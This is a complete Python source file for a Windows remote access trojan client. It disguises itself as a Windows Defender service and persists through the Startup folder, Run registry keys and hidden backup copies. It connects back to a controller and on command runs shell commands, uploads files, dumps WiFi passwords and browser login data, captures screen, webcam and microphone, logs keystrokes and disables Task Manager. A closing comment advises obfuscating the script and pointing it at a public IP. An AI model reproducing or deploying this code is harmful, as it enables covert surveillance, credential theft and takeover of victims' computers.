import socket
import subprocess
import requests
import ctypes
import os
import platform
import sys
import shutil
import time
import tempfile
import io
import json
import getpass
import webbrowser
import sqlite3
import winreg
import base64
import random
import string
import threading

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False
from datetime import datetime, timedelta

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
hwnd = kernel32.GetConsoleWindow()
STARTUP_FILENAME = "WindowsDefenderUpdate.py"
REGISTRY_KEY_NAME = "Windows Security Service"
MUTEX_NAME = "Global\\WindowsDefenderServiceMutex"
PROCESS_MONITOR_INTERVAL = 5
RESTART_DELAY = 3
RECONNECT_DELAY = 10
MAX_RECONNECT_ATTEMPTS = 1000

def random_name(length=8):
    return ''.join(random.choices(string.ascii_lowercase, k=length)) + '.py'

def create_mutex():
    try:
        mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
        if ctypes.windll.kernel32.GetLastError() == 183:
            return False
        return True
    except:
        return True

def get_startup_path():
    try:
        username = getpass.getuser()
        return f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    except:
        return None

def get_current_script_path():
    return os.path.abspath(__file__)

def is_running_from_startup():
    current_path = get_current_script_path()
    startup_path = get_startup_path()
    if startup_path:
        return current_path.lower().startswith(startup_path.lower())
    return False

def hide_terminal():
    try:
        hwnd = user32.GetForegroundWindow()
        user32.ShowWindow(hwnd, 0)
    except:
        pass

def install_to_startup():
    try:
        startup_path = get_startup_path()
        if not startup_path or not os.path.exists(startup_path):
            return None
            
        current_file = get_current_script_path()
        startup_copy = os.path.join(startup_path, STARTUP_FILENAME)
        
        if not is_running_from_startup():
            try:
                shutil.copy2(current_file, startup_copy)
                ctypes.windll.kernel32.SetFileAttributesW(startup_copy, 2)
            except Exception as e:
                return None
        
        add_to_registry(startup_copy)
        
        return startup_copy
    except Exception as e:
        return None

def add_to_registry(file_path):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                           "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                           0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, REGISTRY_KEY_NAME, 0, winreg.REG_SZ, 
                         f'pythonw "{file_path}"')
        winreg.CloseKey(key)
        
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                               "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, REGISTRY_KEY_NAME, 0, winreg.REG_SZ, 
                             f'pythonw "{file_path}"')
            winreg.CloseKey(key)
        except:
            pass
            
    except Exception as e:
        pass

def remove_from_registry():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                           "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                           0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, REGISTRY_KEY_NAME)
        winreg.CloseKey(key)
        
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                               "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                               0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, REGISTRY_KEY_NAME)
            winreg.CloseKey(key)
        except:
            pass
    except:
        pass

def obfuscate_string(s):
    return base64.b64encode(s.encode()).decode()

def create_backup_copies():
    backup_locations = [
        os.path.join(os.environ.get('TEMP', ''), random_name()),
        os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', random_name()),
        os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Windows', random_name())
    ]
    
    current_file = get_current_script_path()
    created_backups = []
    
    for backup_path in backup_locations:
        try:
            os.makedirs(os.path.dirname(backup_path), exist_ok=True)
            shutil.copy2(current_file, backup_path)
            ctypes.windll.kernel32.SetFileAttributesW(backup_path, 2)
            created_backups.append(backup_path)
        except:
            continue
    
    return created_backups

def monitor_and_restart():
    current_pid = os.getpid()
    startup_path = get_startup_path()
    startup_file = os.path.join(startup_path, STARTUP_FILENAME) if startup_path else None
    
    while True:
        try:
            time.sleep(PROCESS_MONITOR_INTERVAL)
            
            if PSUTIL_AVAILABLE:
                if not psutil.pid_exists(current_pid):
                    break
            else:
                try:
                    os.kill(current_pid, 0)
                except OSError:
                    break
                
            if startup_file and not os.path.exists(startup_file):
                install_to_startup()
                
        except Exception as e:
            time.sleep(RESTART_DELAY)
            continue
    
    restart_process()

def restart_process():
    try:
        startup_path = get_startup_path()
        if startup_path:
            startup_file = os.path.join(startup_path, STARTUP_FILENAME)
            if os.path.exists(startup_file):
                subprocess.Popen([sys.executable, startup_file], 
                               creationflags=subprocess.CREATE_NO_WINDOW)
                return
        
        subprocess.Popen([sys.executable, get_current_script_path()], 
                       creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        pass

def setup_persistence():
    try:
        startup_copy = install_to_startup()
        
        create_backup_copies()
        
        if startup_copy and not is_running_from_startup():
            try:
                subprocess.Popen([sys.executable, startup_copy], 
                               creationflags=subprocess.CREATE_NO_WINDOW)
                time.sleep(2)
                sys.exit(0)
            except:
                pass
        
        monitor_thread = threading.Thread(target=monitor_and_restart, daemon=True)
        monitor_thread.start()
        
        return True
    except Exception as e:
        return False

def robust_connect(server_ip, server_port, max_attempts=MAX_RECONNECT_ATTEMPTS):
    attempt = 0
    while attempt < max_attempts:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.settimeout(30)
            
            print(f"Connection attempt {attempt + 1} to {server_ip}:{server_port}")
            client.connect((server_ip, server_port))
            client.settimeout(None)
            print(f"Successfully connected to {server_ip}:{server_port}")
            return client
            
        except Exception as e:
            print(f"Connection failed: {e}. Retrying in {RECONNECT_DELAY} seconds...")
            attempt += 1
            time.sleep(RECONNECT_DELAY)
            
            if attempt % 10 == 0:
                try:
                    setup_persistence()
                except:
                    pass
    
    print("Max connection attempts reached. Restarting client...")
    time.sleep(30)
    start_client(server_ip, server_port)

def handle_command(client, command):
    try:
        if not command:
            return True

        if command.lower() == "exit":
            return False

        if command.lower() == "getip":
            r = requests.get('https://api64.ipify.org?format=json')
            response = r.json()
            output = response['ip']
            client.send(output.encode())
            
        elif command.lower() == "sysinfo":
            info = f"""
System Information:
- OS: {platform.system()} {platform.release()}
- Version: {platform.version()}
- Machine: {platform.machine()}
- Processor: {platform.processor()}
- Username: {os.getlogin()}
- Current Directory: {os.getcwd()}
- Hostname: {platform.node()}
- Python: {platform.python_version()}
            """
            client.send(info.encode())
            
        elif command.lower() == "pwd":
            output = os.getcwd()
            client.send(output.encode())
            
        elif command.lower() == "tasklist":
            try:
                output = subprocess.check_output("tasklist", shell=True, text=True)
            except Exception as e:
                output = str(e)
            client.send(output.encode())
            
        elif command.lower().startswith("kill "):
            process_name = command[5:]
            try:
                result = subprocess.run(f"taskkill /f /im {process_name}", shell=True, capture_output=True, text=True)
                output = result.stdout if result.returncode == 0 else f"Failed: {result.stderr}"
            except Exception as e:
                output = f"Error: {e}"
            client.send(output.encode())
            
        elif command.lower().startswith("cd "):
            new_dir = command[3:]
            try:
                os.chdir(new_dir)
                output = f"Changed to: {os.getcwd()}"
            except Exception as e:
                output = f"Error: {e}"
            client.send(output.encode())
            
        elif command.lower() == "dir" or command.lower() == "ls":
            try:
                files = os.listdir()
                output = "\n".join(files)
            except Exception as e:
                output = f"Error: {e}"
            client.send(output.encode())
            
        elif command.lower().startswith("download "):
            filename = command[9:]
            try:
                if os.path.exists(filename) and os.path.isfile(filename):
                    if os.access(filename, os.R_OK):
                        with open(filename, 'rb') as f:
                            file_data = f.read()
                        client.send(b"FILE_START:" + file_data + b":FILE_END")
                    else:
                        client.send(b"Permission denied: Cannot read file")
                else:
                    client.send(b"File not found")
            except Exception as e:
                client.send(f"Error: {e}".encode())
                
        elif command.lower().startswith("del "):
            filename = command[4:]
            try:
                if os.path.exists(filename):
                    if os.access(filename, os.W_OK):
                        os.remove(filename)
                        output = f"Deleted: {filename}"
                    else:
                        output = "Permission denied: Cannot delete file"
                else:
                    output = "File not found"
            except Exception as e:
                output = f"Error: {e}"
            client.send(output.encode())
            
        elif command.lower() == "screenshot":
            try:
                from PIL import ImageGrab
                import io
                
                screenshot = ImageGrab.grab()
                img_buffer = io.BytesIO()
                screenshot.save(img_buffer, format='PNG')
                img_data = img_buffer.getvalue()
                img_buffer.close()
                
                size_header = f"SCREENSHOT_SIZE:{len(img_data)}".encode()
                client.send(size_header)
                time.sleep(0.1)
                
                client.send(img_data)
                
            except ImportError:
                client.send(b"PIL not installed. Install with: pip install pillow")
            except Exception as e:
                client.send(f"Screenshot Error: {e}".encode())
                
        elif command.lower() == "processes":
            try:
                output = subprocess.check_output("wmic process get name,processid", shell=True, text=True)
            except Exception as e:
                output = str(e)
            client.send(output.encode())
            
        elif command.lower() == "netstat":
            try:
                output = subprocess.check_output("netstat -an", shell=True, text=True)
            except Exception as e:
                output = str(e)
            client.send(output.encode())
            
        elif command.lower() == "systeminfo":
            try:
                output = subprocess.check_output("systeminfo", shell=True, text=True, errors='ignore')
            except Exception as e:
                output = f"Limited info: {e}\nTry individual commands instead."
            client.send(output.encode())
            
        elif command.lower().startswith("find "):
            filename = command[5:]
            try:
                output = subprocess.check_output(f'dir /s /b "*{filename}*"', shell=True, text=True, errors='ignore')
            except Exception as e:
                output = str(e)
            client.send(output.encode())

        elif command.lower() == "wifipasswords":
            try:
                output = subprocess.check_output('netsh wlan show profiles', shell=True, text=True, errors='ignore')
                profiles = [line.split(":")[1].strip() for line in output.split('\n') if "All User Profile" in line]
                
                wifi_passwords = "WiFi Passwords:\n"
                for profile in profiles:
                    try:
                        result = subprocess.check_output(f'netsh wlan show profile "{profile}" key=clear', shell=True, text=True, errors='ignore')
                        for line in result.split('\n'):
                            if "Key Content" in line:
                                password = line.split(":")[1].strip()
                                wifi_passwords += f"{profile}: {password}\n"
                    except:
                        wifi_passwords += f"{profile}: <could not retrieve>\n"
                
                client.send(wifi_passwords.encode())
            except Exception as e:
                client.send(f"Error getting WiFi passwords: {e}".encode())

        elif command.lower() == "browserhistory":
            try:
                history_info = "Browser History:\n"
                browsers = [
                    ("Chrome", os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History")),
                    ("Edge", os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History"))
                ]
                
                for browser_name, browser_db in browsers:
                    if os.path.exists(browser_db):
                        try:
                            temp_db = os.path.join(tempfile.gettempdir(), f"temp_{browser_name}_history")
                            shutil.copy2(browser_db, temp_db)
                            
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            
                            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 20")
                            results = cursor.fetchall()
                            
                            history_info += f"\n--- {browser_name} History (Last 20 sites) ---\n"
                            for url, title, visit_time in results:
                                if visit_time:
                                    try:
                                        dt = datetime(1601, 1, 1) + timedelta(microseconds=visit_time)
                                        date_str = dt.strftime("%Y-%m-%d %H:%M:%S")
                                    except:
                                        date_str = "Unknown time"
                                else:
                                    date_str = "Unknown time"
                                
                                history_info += f"URL: {url}\nTitle: {title}\nLast Visit: {date_str}\n{'-'*50}\n"
                            
                            conn.close()
                            os.remove(temp_db)
                            
                        except Exception as e:
                            history_info += f"\n--- {browser_name} Error: {e} ---\n"
                    else:
                        history_info += f"\n--- {browser_name} not found ---\n"
                
                client.send(history_info.encode())
            except Exception as e:
                client.send(f"Error accessing browser history: {e}".encode())

        elif command.lower() == "webcam":
            try:
                import cv2
                cam = cv2.VideoCapture(0)
                ret, frame = cam.read()
                if ret:
                    _, img_encoded = cv2.imencode('.png', frame)
                    img_data = img_encoded.tobytes()
                    
                    size_header = f"WEBCAM_SIZE:{len(img_data)}".encode()
                    client.send(size_header)
                    time.sleep(0.1)
                    client.send(img_data)
                else:
                    client.send(b"Could not access webcam")
                cam.release()
            except ImportError:
                client.send(b"OpenCV not installed. Install with: pip install opencv-python")
            except Exception as e:
                client.send(f"Webcam Error: {e}".encode())

        elif command.lower() == "keylogger_start":
            try:
                from pynput import keyboard
                import threading
                
                log_file = os.path.join(tempfile.gettempdir(), "keylog.txt")
                keys = []
                
                def on_press(key):
                    try:
                        keys.append(str(key).replace("'", ""))
                        if len(keys) > 50:
                            with open(log_file, "a", encoding="utf-8") as f:
                                f.write("".join(keys) + "\n")
                            keys.clear()
                    except:
                        pass
                
                listener = keyboard.Listener(on_press=on_press)
                listener.start()
                client.send(b"Keylogger started - checking temp folder for keylog.txt")
            except ImportError:
                client.send(b"pynput not installed. Install with: pip install pynput")
            except Exception as e:
                client.send(f"Keylogger Error: {e}".encode())

        elif command.lower() == "mic_record":
            try:
                import pyaudio
                import wave
                
                CHUNK = 1024
                FORMAT = pyaudio.paInt16
                CHANNELS = 1
                RATE = 4410
                RECORD_SECONDS = 10
                
                audio = pyaudio.PyAudio()
                stream = audio.open(format=FORMAT, channels=CHANNELS,
                                  rate=RATE, input=True,
                                  frames_per_buffer=CHUNK)
                
                frames = []
                for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                    data = stream.read(CHUNK)
                    frames.append(data)
                
                stream.stop_stream()
                stream.close()
                audio.terminate()
                
                temp_wav = os.path.join(tempfile.gettempdir(), "recorded_audio.wav")
                wf = wave.open(temp_wav, 'wb')
                wf.setnchannels(CHANNELS)
                wf.setsampwidth(audio.get_sample_size(FORMAT))
                wf.setframerate(RATE)
                wf.writeframes(b''.join(frames))
                wf.close()
                
                with open(temp_wav, 'rb') as f:
                    audio_data = f.read()
                
                os.remove(temp_wav)
                client.send(b"AUDIO_START:" + audio_data + b":AUDIO_END")
                
            except ImportError:
                client.send(b"PyAudio not installed. Install with: pip install pyaudio")
            except Exception as e:
                client.send(f"Microphone Error: {e}".encode())

        elif command.lower() == "clipboard":
            try:
                import win32clipboard
                win32clipboard.OpenClipboard()
                data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                client.send(f"Clipboard: {data}".encode())
            except ImportError:
                client.send(b"pywin32 not installed. Install with: pip install pywin32")
            except Exception as e:
                client.send(f"Clipboard Error: {e}".encode())

        elif command.lower() == "startup":
            try:
                startup_path = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
                if os.path.exists(startup_path):
                    files = os.listdir(startup_path)
                    output = f"Startup files:\n" + "\n".join(files)
                else:
                    output = "Startup folder not found"
                client.send(output.encode())
            except Exception as e:
                client.send(f"Startup Error: {e}".encode())

        elif command.lower().startswith("message "):
            try:
                message_text = command[8:]
                ctypes.windll.user32.MessageBoxW(0, message_text, "System Message", 0x1000)
                client.send(b"Message displayed")
            except Exception as e:
                client.send(f"Message Error: {e}".encode())

        elif command.lower().startswith("beep "):
            try:
                import winsound
                duration = int(command[5:])
                winsound.Beep(1000, duration)
                client.send(b"Beep played")
            except:
                client.send(b"Beep failed")

        elif command.lower() == "disable_taskmgr":
            try:
                subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f', shell=True)
                client.send(b"Task Manager disabled")
            except Exception as e:
                client.send(f"Error: {e}".encode())

        elif command.lower() == "enable_taskmgr":
            try:
                subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f', shell=True)
                client.send(b"Task Manager enabled")
            except Exception as e:
                client.send(f"Error: {e}".encode())

        elif command.lower() == "shutdown":
            try:
                subprocess.run("shutdown /s /t 30", shell=True)
                client.send(b"System will shutdown in 30 seconds")
            except Exception as e:
                client.send(f"Error: {e}".encode())

        elif command.lower() == "restart":
            try:
                subprocess.run("shutdown /r /t 30", shell=True)
                client.send(b"System will restart in 30 seconds")
            except Exception as e:
                client.send(f"Error: {e}".encode())

        elif command.lower() == "cancel_shutdown":
            try:
                subprocess.run("shutdown /a", shell=True)
                client.send(b"Shutdown cancelled")
            except Exception as e:
                client.send(f"Error: {e}".encode())

        elif command.lower() == "all":
            try:
                profiles_info = "Browser Profiles & Accounts:\n"
                browsers = [
                    ("Chrome", os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data")),
                    ("Edge", os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data")),
                    ("Opera GX", os.path.expanduser("~\\AppData\\Roaming\\Opera Software\\Opera GX Stable")),
                    ("Firefox", os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"))
                ]
                
                for browser_name, browser_path in browsers:
                    if os.path.exists(browser_path):
                        profiles_info += f"\n--- {browser_name} ---\n"
                        
                        if browser_name in ["Chrome", "Edge"]:
                            try:
                                profiles = []
                                for item in os.listdir(browser_path):
                                    full_path = os.path.join(browser_path, item)
                                    if os.path.isdir(full_path) and (item.startswith("Profile") or item == "Default" or item == "Guest Profile"):
                                        profiles.append(item)
                                
                                for profile in profiles:
                                    profile_path = os.path.join(browser_path, profile)
                                    login_data_file = os.path.join(profile_path, "Login Data")
                                    
                                    if os.path.exists(login_data_file):
                                        try:
                                            temp_db = os.path.join(tempfile.gettempdir(), f"temp_{browser_name}_{profile}_logins")
                                            shutil.copy2(login_data_file, temp_db)
                                            
                                            conn = sqlite3.connect(temp_db)
                                            cursor = conn.cursor()
                                            
                                            cursor.execute("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''")
                                            logins = cursor.fetchall()
                                            
                                            if logins:
                                                profiles_info += f"Profile: {profile}\n"
                                                for url, username, _ in logins:
                                                    domain = url.split('/')[2] if '/' in url else url
                                                    profiles_info += f"  {domain}: {username}\n"
                                            else:
                                                profiles_info += f"Profile: {profile} - No saved logins found\n"
                                            
                                            conn.close()
                                            os.remove(temp_db)
                                            
                                        except Exception as e:
                                            prefs_file = os.path.join(profile_path, "Preferences")
                                            if os.path.exists(prefs_file):
                                                try:
                                                    with open(prefs_file, 'r', encoding='utf-8', errors='ignore') as f:
                                                        prefs = json.load(f)
                                                    
                                                    account_info = ""
                                                    if 'account_info' in prefs:
                                                        for acc in prefs['account_info']:
                                                            if 'email' in acc:
                                                                account_info += f"  Email: {acc['email']}\n"
                                                    
                                                    if account_info:
                                                        profiles_info += f"Profile: {profile}\n{account_info}"
                                                    else:
                                                        profiles_info += f"Profile: {profile} - No accounts found\n"
                                                    
                                                except:
                                                    profiles_info += f"Profile: {profile} - Error reading data\n"
                                
                            except Exception as e:
                                profiles_info += f"Error reading {browser_name}: {e}\n"
                        
                        elif browser_name == "Firefox":
                            try:
                                for profile_folder in os.listdir(browser_path):
                                    if os.path.isdir(os.path.join(browser_path, profile_folder)):
                                        profile_info = f"Profile: {profile_folder}\n"
                                        
                                        key4_db = os.path.join(browser_path, profile_folder, "key4.db")
                                        logins_json = os.path.join(browser_path, profile_folder, "logins.json")
                                        
                                        if os.path.exists(logins_json):
                                            try:
                                                with open(logins_json, 'r', encoding='utf-8') as f:
                                                    logins_data = json.load(f)
                                                
                                                if 'logins' in logins_data:
                                                    found_logins = False
                                                    for login in logins_data['logins']:
                                                        if 'hostname' in login and 'encryptedUsername' in login:
                                                            domain = login['hostname']
                                                            profiles_info += f"  {domain}: [Encrypted username - requires master password]\n"
                                                            found_logins = True
                                                    
                                                    if not found_logins:
                                                        profile_info += "  No readable logins found\n"
                                                else:
                                                    profile_info += "  No saved logins\n"
                                                    
                                            except Exception as e:
                                                profile_info += f"  Error reading logins: {e}\n"
                                        else:
                                            profile_info += "  No login data found\n"
                                        
                                        places_db = os.path.join(browser_path, profile_folder, "places.sqlite")
                                        if os.path.exists(places_db):
                                            try:
                                                temp_db = os.path.join(tempfile.gettempdir(), f"temp_firefox_{profile_folder}")
                                                shutil.copy2(places_db, temp_db)
                                                
                                                conn = sqlite3.connect(temp_db)
                                                cursor = conn.cursor()
                                                
                                                cursor.execute("""
                                                    SELECT url, title FROM moz_places 
                                                    WHERE (url LIKE '%login%' OR url LIKE '%account%' OR url LIKE '%signin%')
                                                    AND (url LIKE '%roblox%' OR url LIKE '%discord%' OR url LIKE '%instagram%' 
                                                    OR url LIKE '%tiktok%' OR url LIKE '%youtube%' OR url LIKE '%google%'
                                                    OR url LIKE '%facebook%' OR url LIKE '%twitter%' OR url LIKE '%github%')
                                                    ORDER BY last_visit_date DESC LIMIT 10
                                                """)
                                                results = cursor.fetchall()
                                                
                                                if results:
                                                    profile_info += "  Recent account-related visits:\n"
                                                    for url, title in results:
                                                        domain = url.split('/')[2] if '/' in url else url
                                                        profile_info += f"    - {domain}\n"
                                                
                                                conn.close()
                                                os.remove(temp_db)
                                            except Exception as e:
                                                pass
                                        
                                        profiles_info += profile_info
                                        
                            except Exception as e:
                                profiles_info += f"Error reading Firefox: {e}\n"
                        
                        elif browser_name == "Opera GX":
                            try:
                                login_data_file = os.path.join(browser_path, "Default", "Login Data")
                                if os.path.exists(login_data_file):
                                    try:
                                        temp_db = os.path.join(tempfile.gettempdir(), "temp_opera_logins")
                                        shutil.copy2(login_data_file, temp_db)
                                        
                                        conn = sqlite3.connect(temp_db)
                                        cursor = conn.cursor()
                                        
                                        cursor.execute("SELECT origin_url, username_value FROM logins WHERE username_value != ''")
                                        logins = cursor.fetchall()
                                        
                                        if logins:
                                            profiles_info += "Saved logins:\n"
                                            for url, username in logins:
                                                domain = url.split('/')[2] if '/' in url else url
                                                profiles_info += f"  {domain}: {username}\n"
                                        else:
                                            profiles_info += "No saved logins found\n"
                                        
                                        conn.close()
                                        os.remove(temp_db)
                                        
                                    except Exception as e:
                                        profiles_info += f"Error reading login data: {e}\n"
                                else:
                                    profiles_info += "No login data found\n"
                                    
                            except Exception as e:
                                profiles_info += f"Error reading Opera GX: {e}\n"
                    
                    else:
                        profiles_info += f"\n--- {browser_name} not installed ---\n"
                
                profiles_info += "\n--- Specific Website Accounts Detected ---\n"
                
                website_patterns = {
                    'Roblox': ['roblox.com', 'www.roblox.com'],
                    'TikTok': ['tiktok.com', 'www.tiktok.com'],
                    'Instagram': ['instagram.com', 'www.instagram.com'],
                    'YouTube': ['youtube.com', 'www.youtube.com'],
                    'Gmail': ['gmail.com', 'mail.google.com'],
                    'Discord': ['discord.com', 'www.discord.com', 'discord.gg'],
                    'Facebook': ['facebook.com', 'www.facebook.com'],
                    'Twitter': ['twitter.com', 'www.twitter.com', 'x.com'],
                    'Reddit': ['reddit.com', 'www.reddit.com'],
                    'Netflix': ['netflix.com', 'www.netflix.com'],
                    'Amazon': ['amazon.com', 'www.amazon.com'],
                    'Spotify': ['spotify.com', 'www.spotify.com'],
                    'Twitch': ['twitch.tv', 'www.twitch.tv'],
                    'Steam': ['steamcommunity.com', 'store.steampowered.com'],
                    'Epic Games': ['epicgames.com', 'www.epicgames.com'],
                    'PayPal': ['paypal.com', 'www.paypal.com'],
                    'Microsoft': ['microsoft.com', 'login.live.com'],
                    'Yahoo': ['yahoo.com', 'mail.yahoo.com'],
                    'Outlook': ['outlook.com', 'live.com'],
                    'GitHub': ['github.com', 'www.github.com'],
                    'LinkedIn': ['linkedin.com', 'www.linkedin.com'],
                    'Pinterest': ['pinterest.com', 'www.pinterest.com'],
                    'Snapchat': ['snapchat.com', 'www.snapchat.com'],
                    'WhatsApp': ['web.whatsapp.com'],
                    'Telegram': ['web.telegram.org'],
                    'Zoom': ['zoom.us', 'www.zoom.us'],
                    'Shopify': ['shopify.com', 'www.shopify.com'],
                    'WordPress': ['wordpress.com', 'www.wordpress.com'],
                    'Ebay': ['ebay.com', 'www.ebay.com'],
                    'AliExpress': ['aliexpress.com', 'www.aliexpress.com']
                }
                
                browser_paths = [
                    ("Chrome", os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data")),
                    ("Edge", os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data")),
                    ("Opera GX", os.path.expanduser("~\\AppData\\Roaming\\Opera Software\\Opera GX Stable"))
                ]
                
                for browser_name, browser_path in browser_paths:
                    if os.path.exists(browser_path):
                        try:
                            history_files = []
                            for item in os.listdir(browser_path):
                                item_path = os.path.join(browser_path, item)
                                if os.path.isdir(item_path):
                                    history_path = os.path.join(item_path, "History")
                                    if os.path.exists(history_path):
                                        history_files.append((browser_name, history_path, item))
                            
                            for bname, history_file, profile in history_files:
                                try:
                                    temp_db = os.path.join(tempfile.gettempdir(), f"temp_{bname}_{profile}_history")
                                    shutil.copy2(history_file, temp_db)
                                    
                                    conn = sqlite3.connect(temp_db)
                                    cursor = conn.cursor()
                                    
                                    for site_name, domains in website_patterns.items():
                                        domain_conditions = " OR ".join([f"url LIKE '%{domain}%'" for domain in domains])
                                        cursor.execute(f"SELECT url, title FROM urls WHERE {domain_conditions} ORDER BY last_visit_time DESC LIMIT 5")
                                        results = cursor.fetchall()
                                        
                                        if results:
                                            profiles_info += f"  {site_name}: Active in {bname} (Profile: {profile})\n"
                                            for url, title in results[:2]: 
                                                profiles_info += f"    - {url}\n"
                                    
                                    conn.close()
                                    os.remove(temp_db)
                                    
                                except Exception as e:
                                    continue
                                    
                        except Exception as e:
                            continue
                
                client.send(profiles_info.encode())
                
            except Exception as e:
                client.send(f"Error getting browser profiles: {e}".encode())

        elif command.lower() == "av_evasion_demo":
            try:
                evasion_info = "Educational AV Evasion Techniques:\n"
                
                current_file = os.path.abspath(__file__)
                file_stats = os.stat(current_file)
                evasion_info += f"File Size: {file_stats.st_size} bytes\n"
                evasion_info += f"File Location: {current_file}\n"
                
                client.send(evasion_info.encode())
            except Exception as e:
                client.send(f"Evasion demo failed: {e}".encode())

        elif command.lower() == "behavior_evasion":
            try:
                time.sleep(random.uniform(0.1, 2.0))
                
                dummy_files = []
                for i in range(3):
                    dummy_name = os.path.join(tempfile.gettempdir(), f"dummy_{random_name(6)}.tmp")
                    with open(dummy_name, 'w') as f:
                        f.write("Legitimate system file")
                    dummy_files.append(dummy_name)
                
                time.sleep(1)
                
                for dummy_file in dummy_files:
                    try:
                        os.remove(dummy_file)
                    except:
                        pass
                
                client.send(b"Educational: Behavioral evasion techniques demonstrated")
            except Exception as e:
                client.send(f"Behavior evasion failed: {e}".encode())

        else:
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True, errors='ignore')
            except subprocess.CalledProcessError as e:
                output = e.output
            except Exception as e:
                output = str(e)
            client.send(output.encode())
            
        return True
        
    except Exception as e:
        print(f"Error handling command: {e}")
        return True

def start_client(server_ip, server_port):
    if not create_mutex():
        print("Another instance is already running, exiting...")
        sys.exit(0)
    
    hide_terminal()
    
    try:
        setup_persistence()
    except Exception as e:
        print(f"Persistence setup failed: {e}")
        pass
    
    try:
        kernel32.SetConsoleTitleW("svchost.exe")
    except:
        pass
    
    print(f"Starting persistent client - connecting to {server_ip}:{server_port}")
    
    while True:
        try:
            client = robust_connect(server_ip, server_port)
            
            while True:
                try:
                    command = client.recv(1024).decode()
                    
                    if not command:
                        raise ConnectionResetError("Connection lost")
                    
                    if not handle_command(client, command):
                        break
                        
                except socket.timeout:
                    try:
                        client.send(b" ")
                    except:
                        break
                    continue
                except (ConnectionResetError, BrokenPipeError, socket.error) as e:
                    print(f"Connection error: {e}")
                    break
                except Exception as e:
                    print(f"Unexpected error: {e}")
                    break
            
            try:
                client.close()
            except:
                pass
                
            print("Connection lost. Reconnecting...")
            time.sleep(RECONNECT_DELAY)
            
        except Exception as e:
            print(f"Client error: {e}. Restarting connection loop...")
            time.sleep(RECONNECT_DELAY)

def test_connection(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False

def find_server_ip():
    if test_connection("127.0.0.1", 5555):
        return "127.0.0.1"
    
    local_ips = ["192.168.1.100", "192.168.0.100", "10.0.0.100", "172.16.0.100"]
    for ip in local_ips:
        if test_connection(ip, 5555):
            return ip
    
    return "127.0.0.1"

def main():
    SERVER_IP = "127.0.0.1" #turn this to your public ip BUT make this script a exe or obfuscate it you prob have to turn all other 127.0.0.1 to your public ip i dont even know tbh.(but for sure)
    SERVER_PORT = 5555 
    
    if not test_connection(SERVER_IP, SERVER_PORT):
        print(f"Cannot connect to {SERVER_IP}:{SERVER_PORT}, looking for server...")
        SERVER_IP = find_server_ip()
    
    print(f"Starting persistent client to {SERVER_IP}:{SERVER_PORT}")
    
    start_client(SERVER_IP, SERVER_PORT)

if __name__ == "__main__":
    main()